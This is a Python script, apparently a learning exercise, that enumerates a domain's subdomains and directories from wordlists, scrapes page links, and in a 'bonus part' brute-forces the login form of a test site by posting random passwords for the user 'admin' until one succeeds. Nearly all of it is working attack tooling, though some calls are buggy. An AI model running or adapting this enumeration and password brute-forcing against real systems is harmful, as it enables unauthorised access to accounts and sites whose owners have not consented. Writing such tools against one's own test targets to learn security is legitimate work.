import requests
import sys
import re
import random


# Initializing empty arrays
subdomains_output = []
directories_output = []
files_output = []

# Clearing the content of all the files first
open("./subdomains_output.bat", "w").close()
open("./directories_output.bat", "w").close()
open("./files_output.bat", "w").close()


# Function that test for posible existing subdomain for a given domain
def testingSubdomains(target_url):
    try: 
        requests.get("http://"+target_url)
        input_file =  open("./input_files/subdomains_dictionary.bat", "r")
        subdomains_output_file = open("./subdomains_output.bat", "a")
        for line in input_file: 
            subdomain = re.sub(r"^\s+|\s+$", ""+line)
            if subdomain[len(subdomain)-1] == "." :
                url = subdomain +""+ target_url
            else:
                url = subdomain +"."+ target_url
            print(url)
            try: 
                response = requests.get("http://" + url)
                if response.status_code == 200:
                    subdomains_output.append(url)
                    subdomains_output_file.write(url +"\n")
                    print(f"This subdomain exist {url} !!!!!!!!!!!!!!!")
                    print(subdomains_output)
            except requests.exceptions.ConnectionError:
                pass
        input_file.close()
        subdomains_output_file.close()
    except requests.exceptions.ConnectionError:
        print("No such domain")
    return subdomains_output

# Function that test for posible existing directories for a given domain
def testingDirectories(target_url):
    try:
        requests.get("http://"+target_url)
        input_file =  open("./input_files/dirs_dictionary.bat", "r")
        directories_output_file = open("./directories_output.bat", "a")
        for line in input_file: 
            directory = re.sub(r"^\s+|\s+$", ""+line)
            url = target_url +"/"+ directory
            try:
                response = requests.get("http://" + url)
                if response.status_code == 200:
                    directories_output.append(url)
                    directories_output_file.write(url +"\n")
                    # Fetching the files for each existing subdirectory of the domain
                    print(fetchingFiles(url))
                    print(f"This directory {url} exist !!!!!!!!!!!!!!!")
            except requests.exceptions.ConnectionError:
                pass
        input_file.close()
        directories_output_file.close()
    except requests.exceptions.ConnectionError:
        print("No such directory")
    return directories_output
    
# Function that fetch all the link files of a url using regex
def fetchingFiles(target_url):
    files_output_file = open("./files_output.bat", "a")
    try:
        response = requests.get("http://"+target_url)
        files_output =  re.findall('href="(.*?)"', response.content.decode('utf-8'))
        for link in files_output:
            files_output_file.write(link +"\n")
        files_output_file.close()
        return files_output
    except requests.exceptions.ConnectionError:
        return "No such file"

# Checking for arguments
if len(sys.argv) < 2:
    print("Please provide a url without the 'www.'")
else: 
    target_url = sys.argv[1]
    print("URL: "+target_url)
    testingSubdomains(target_url)
    testingDirectories(target_url)
    fetchingFiles(target_url)

# Bonus part:


# This is the url used for testing
url = "https://requestswebsite.notanothercoder.repl.co/confirm-login"

# All the characters we are using to generate a password
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()[]\{\}\\\.\""

# The actual username for the link I am using
username="admin"

#The actual password is "12"

#Function that will send a post request to the target website and return the reponse
def send_request(username, password): 
    form_data = {
        "username": username,
        "password": password
    }
    response = requests.post(url, data=form_data)
    return response

# Function that generate passwords to be sent and tested in the target url
def password_generator():
    while True:
        valid = False
        while not valid:
            random_pass = random.choices(chars, k=random.randint(1,17))
            password = "".join(random_pass)
            file = open("password_tries.bat","r")
            tries = file.read()
            file.close()
            if password in tries: 
                pass
            else:
                valid = True
        response = send_request(username, password)

        if 'failed to login' in response.text.lower():
            tested_passwords = open("password_tries.bat", "a")
            tested_passwords.write(password + "\n")
            tested_passwords.close()
            print("Incorrect" +password)
        else: 
            correct_password = open("correct_pass.bat","w")
            correct_password.write(password + "\n")
            print("Correct Password"+password+"\n")
password_generator()
